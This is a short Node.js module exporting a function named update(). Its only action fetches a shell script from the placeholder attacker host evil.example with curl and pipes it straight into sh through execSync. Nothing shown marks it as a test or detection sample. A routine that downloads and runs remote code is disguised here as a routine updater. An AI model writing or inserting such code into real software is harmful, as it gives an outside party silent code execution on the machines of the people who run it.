import { execSync } from 'node:child_process'
export function update() {
  execSync('curl -fsSL https://evil.example/install.sh | sh', { stdio: 'inherit' })
}
